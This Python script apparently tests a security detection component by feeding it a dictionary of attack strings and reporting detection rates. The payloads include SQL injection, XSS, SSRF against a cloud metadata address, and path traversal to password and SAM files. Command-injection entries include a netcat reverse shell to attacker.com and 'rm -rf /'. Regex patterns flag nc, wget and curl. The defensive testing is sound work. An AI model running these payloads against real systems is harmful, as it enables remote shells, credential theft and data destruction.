#!/usr/bin/env python3
"""
Offline Attack Simulation for Parasite Guard Validation.

Tests the parasite guard detection pipeline without requiring a running server.
Directly exercises detectors, state machine, and response generation.
"""

import asyncio
import logging
import sys
import time
from collections import defaultdict
from dataclasses import dataclass, field
from datetime import UTC, datetime
from pathlib import Path

# Add project root to path
project_root = Path(__file__).parent.parent.parent
sys.path.insert(0, str(project_root / "src"))

logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s - %(levelname)s - %(message)s",
)
logger = logging.getLogger("offline_attack_simulation")


# =============================================================================
# Attack Payloads for Testing
# =============================================================================

INJECTION_PAYLOADS = {
    "sql_injection": [
        "'; DROP TABLE users; --",
        "1' OR '1'='1",
        "admin'--",
        "1; SELECT * FROM passwords",
        "' UNION SELECT username, password FROM users--",
        "1' AND SLEEP(5)--",
    ],
    "xss": [
        "<script>alert('XSS')</script>",
        "<img src=x onerror=alert('XSS')>",
        "javascript:alert('XSS')",
        "<svg onload=alert('XSS')>",
        "<iframe src='javascript:alert(1)'>",
        "data:text/html,<script>alert('XSS')</script>",
    ],
    "command_injection": [
        "; cat /etc/passwd",
        "| nc attacker.com 4444 -e /bin/bash",
        "$(whoami)",
        "`id`",
        "& ping -c 10 attacker.com",
        "; rm -rf / --no-preserve-root",
    ],
    "path_traversal": [
        "../../../etc/passwd",
        "....//....//....//etc/passwd",
        "/etc/passwd",
        "..\\..\\..\\windows\\system32\\config\\sam",
        "file:///etc/passwd",
        "%00/etc/passwd",
    ],
    "ssrf": [
        "http://169.254.169.254/latest/meta-data/",
        "http://localhost:22",
        "http://127.0.0.1:6379/",
        "http://[::1]/admin",
        "http://internal.network/secrets",
    ],
    "template_injection": [
        "{{7*7}}",
        "${7*7}",
        "#{7*7}",
        "{{config.items()}}",
        "<%= 7*7 %>",
    ],
    "deserialization": [
        "pickle.loads(b'...')",
        "yaml.load(user_input)",
        "__import__('os').system('whoami')",
    ],
    "parasitic_code": [
        "eval(user_input)",
        "exec(code)",
        "__import__('ctypes')",
        "sys.settrace(evil_tracer)",
        "def _hidden_backdoor():",
    ],
}


@dataclass
class AttackResult:
    """Result from a single attack test."""

    category: str
    payload: str
    detected: bool
    severity: str = "UNKNOWN"
    indicators: list[str] = field(default_factory=list)
    response_time_ms: float = 0.0
    timestamp: datetime = field(default_factory=lambda: datetime.now(UTC))


@dataclass
class SimulationReport:
    """Aggregated simulation report."""

    total_attacks: int = 0
    detected_attacks: int = 0
    missed_attacks: int = 0
    detection_rate: float = 0.0
    avg_detection_time_ms: float = 0.0
    by_category: dict[str, dict[str, int]] = field(default_factory=dict)
    results: list[AttackResult] = field(default_factory=list)
    state_transitions: list[str] = field(default_factory=list)


class OfflineAttackSimulator:
    """Simulates attacks directly against detection components."""

    def __init__(self):
        self.report = SimulationReport()
        self.threat_profile = None
        self.detectors_available = False
        self._init_components()

    def _init_components(self):
        """Initialize detection components."""
        try:
            from grid.security import get_threat_profile, initialize_threat_profile

            initialize_threat_profile()
            self.threat_profile = get_threat_profile()
            self.detectors_available = True
            logger.info("Threat profile loaded successfully")
        except ImportError as e:
            logger.warning(f"Could not load threat profile: {e}")
            self.detectors_available = False

        # Try to load parasite guard components
        try:
            from infrastructure.parasite_guard.config import ParasiteGuardConfig
            from infrastructure.parasite_guard.detectors import DetectorChain

            self.config = ParasiteGuardConfig()
            logger.info("Parasite Guard config loaded")
        except ImportError as e:
            logger.warning(f"Could not load parasite guard: {e}")

    def test_payload(self, category: str, payload: str) -> AttackResult:
        """Test a single payload against detection."""
        start_time = time.time()
        detected = False
        severity = "UNKNOWN"
        indicators = []

        if self.threat_profile:
            try:
                result = self.threat_profile.check(payload)
                detected = result.get("detected", False)
                severity = result.get("severity", "UNKNOWN")
                indicators = [i.get("name", "unknown") for i in result.get("indicators", [])]
            except Exception as e:
                logger.debug(f"Detection error: {e}")

        response_time = (time.time() - start_time) * 1000

        return AttackResult(
            category=category,
            payload=payload[:100],  # Truncate for display
            detected=detected,
            severity=severity,
            indicators=indicators,
            response_time_ms=response_time,
        )

    def run_category_tests(self, category: str, payloads: list[str]) -> list[AttackResult]:
        """Run all tests for a category."""
        results = []
        for payload in payloads:
            result = self.test_payload(category, payload)
            results.append(result)
            self.report.results.append(result)

            status = "DETECTED" if result.detected else "MISSED"
            logger.info(f"  [{status}] {category}: {payload[:50]}...")

        return results

    def run_full_simulation(self) -> SimulationReport:
        """Run complete attack simulation."""
        print("\n" + "=" * 80)
        print("OFFLINE ATTACK SIMULATION")
        print("=" * 80)

        if not self.detectors_available:
            print("\n⚠️  Threat profile not available - running basic pattern tests")
            self._run_basic_pattern_tests()
        else:
            print("\n✅ Threat profile loaded - running full detection tests")
            self._run_full_detection_tests()

        # Calculate metrics
        self._calculate_metrics()

        return self.report

    def _run_basic_pattern_tests(self):
        """Run basic regex pattern tests without full threat profile."""
        import re

        # Basic patterns for detection
        patterns = {
            "sql_injection": [
                r"(?i)(union\s+select|drop\s+table|insert\s+into)",
                r"(?i)'\s*(or|and)\s*'?\d*'?\s*=\s*'?\d*'?",
                r"(?i);\s*(select|drop|delete|update|insert)",
            ],
            "xss": [
                r"<script[^>]*>",
                r"javascript:",
                r"on(error|load|click|mouseover)\s*=",
            ],
            "command_injection": [
                r"[;&|`$]",
                r"(?i)(cat|nc|wget|curl)\s+",
            ],
            "path_traversal": [
                r"\.\./",
                r"\.\.\\",
                r"/etc/passwd",
            ],
        }

        for category, payloads in INJECTION_PAYLOADS.items():
            print(f"\n📋 Testing {category.upper()}:")
            category_patterns = patterns.get(category, [])

            for payload in payloads:
                detected = False
                for pattern in category_patterns:
                    if re.search(pattern, payload):
                        detected = True
                        break

                result = AttackResult(
                    category=category,
                    payload=payload[:100],
                    detected=detected,
                    severity="HIGH" if detected else "UNKNOWN",
                )
                self.report.results.append(result)

                status = "DETECTED" if detected else "MISSED"
                logger.info(f"  [{status}] {payload[:50]}...")

    def _run_full_detection_tests(self):
        """Run full detection tests with threat profile."""
        for category, payloads in INJECTION_PAYLOADS.items():
            print(f"\n📋 Testing {category.upper()}:")
            self.run_category_tests(category, payloads)

    def _calculate_metrics(self):
        """Calculate final metrics."""
        self.report.total_attacks = len(self.report.results)
        self.report.detected_attacks = sum(1 for r in self.report.results if r.detected)
        self.report.missed_attacks = self.report.total_attacks - self.report.detected_attacks
        self.report.detection_rate = (
            self.report.detected_attacks / self.report.total_attacks if self.report.total_attacks > 0 else 0.0
        )
        self.report.avg_detection_time_ms = (
            sum(r.response_time_ms for r in self.report.results) / len(self.report.results)
            if self.report.results
            else 0.0
        )

        # Calculate by category
        by_cat = defaultdict(lambda: {"total": 0, "detected": 0, "missed": 0})
        for r in self.report.results:
            by_cat[r.category]["total"] += 1
            if r.detected:
                by_cat[r.category]["detected"] += 1
            else:
                by_cat[r.category]["missed"] += 1
        self.report.by_category = dict(by_cat)

    def print_summary(self):
        """Print detailed summary."""
        print("\n" + "=" * 80)
        print("SIMULATION RESULTS")
        print("=" * 80)

        print("\n📊 Overall Metrics:")
        print(f"  Total Attacks Tested:  {self.report.total_attacks}")
        print(f"  Attacks Detected:      {self.report.detected_attacks}")
        print(f"  Attacks Missed:        {self.report.missed_attacks}")
        print(f"  Detection Rate:        {self.report.detection_rate:.1%}")
        print(f"  Avg Detection Time:    {self.report.avg_detection_time_ms:.3f}ms")

        print("\n📋 Results by Category:")
        print(f"  {'Category':<25} {'Detected':<10} {'Missed':<10} {'Rate':<10}")
        print(f"  {'-' * 55}")

        for category, stats in sorted(self.report.by_category.items()):
            rate = stats["detected"] / stats["total"] if stats["total"] > 0 else 0.0
            status = "✅" if rate >= 0.8 else "⚠️" if rate >= 0.5 else "❌"
            print(f"  {status} {category:<22} {stats['detected']:<10} {stats['missed']:<10} {rate:.0%}")

        # Print missed attacks for review
        missed = [r for r in self.report.results if not r.detected]
        if missed:
            print("\n⚠️  Missed Attacks (requiring attention):")
            for r in missed[:10]:  # Show first 10
                print(f"  - [{r.category}] {r.payload[:60]}...")
            if len(missed) > 10:
                print(f"  ... and {len(missed) - 10} more")

        print(f"\n{'=' * 80}")

        # Overall assessment
        if self.report.detection_rate >= 0.9:
            print("✅ EXCELLENT: Detection rate above 90%")
        elif self.report.detection_rate >= 0.7:
            print("⚠️  GOOD: Detection rate above 70%, some patterns need improvement")
        elif self.report.detection_rate >= 0.5:
            print("⚠️  FAIR: Detection rate above 50%, significant gaps exist")
        else:
            print("❌ POOR: Detection rate below 50%, critical improvements needed")

        print(f"{'=' * 80}\n")


async def run_state_machine_test():
    """Test state machine transitions."""
    print("\n" + "=" * 80)
    print("STATE MACHINE TRANSITION TEST")
    print("=" * 80)

    try:
        from infrastructure.parasite_guard.state_machine import (
            ParasiteStateMachine,
            StateMachineState,
        )

        sm = ParasiteStateMachine()
        print("\n✅ State Machine initialized")
        print(f"   Initial state: {sm.current_state}")

        transitions = [
            ("start_monitoring", "Begin monitoring"),
            ("detect_anomaly", "Anomaly detected"),
            ("trigger_mitigation", "Mitigation triggered"),
            ("complete_mitigation", "Mitigation complete"),
            ("return_to_monitoring", "Return to monitoring"),
        ]

        print("\n🔄 Testing State Transitions:")
        for action, description in transitions:
            try:
                if hasattr(sm, action):
                    getattr(sm, action)()
                    print(f"   ✅ {description}: {sm.current_state}")
                else:
                    # Try generic transition
                    print(f"   ⚠️  {description}: Method not found")
            except Exception as e:
                print(f"   ❌ {description}: {e}")

    except ImportError as e:
        print(f"\n⚠️  State machine not available: {e}")


async def run_detector_chain_test():
    """Test detector chain directly."""
    print("\n" + "=" * 80)
    print("DETECTOR CHAIN TEST")
    print("=" * 80)

    try:
        from infrastructure.parasite_guard.config import ParasiteGuardConfig
        from infrastructure.parasite_guard.detectors import DetectorChain

        config = ParasiteGuardConfig()

        # Try to create detector chain
        print("\n✅ Parasite Guard Config loaded")
        print(f"   Enabled: {config.enabled}")
        print(f"   Mode: {config.global_mode.name if config.global_mode else 'component-level'}")

    except ImportError as e:
        print(f"\n⚠️  Detector chain not available: {e}")


def main():
    """Main entry point."""
    import argparse

    parser = argparse.ArgumentParser(description="Offline Attack Simulation")
    parser.add_argument("--verbose", "-v", action="store_true", help="Verbose output")
    parser.add_argument("--category", help="Test specific category only")
    args = parser.parse_args()

    if args.verbose:
        logging.getLogger().setLevel(logging.DEBUG)

    # Run attack simulation
    simulator = OfflineAttackSimulator()

    if args.category and args.category in INJECTION_PAYLOADS:
        # Test specific category
        print(f"\nTesting category: {args.category}")
        simulator.run_category_tests(args.category, INJECTION_PAYLOADS[args.category])
        simulator._calculate_metrics()
    else:
        # Full simulation
        simulator.run_full_simulation()

    simulator.print_summary()

    # Run additional component tests
    asyncio.run(run_state_machine_test())
    asyncio.run(run_detector_chain_test())

    # Exit code based on detection rate
    if simulator.report.detection_rate >= 0.7:
        print("\n✅ Attack simulation PASSED")
        return 0
    else:
        print("\n❌ Attack simulation FAILED - detection rate below threshold")
        return 1


if __name__ == "__main__":
    sys.exit(main())
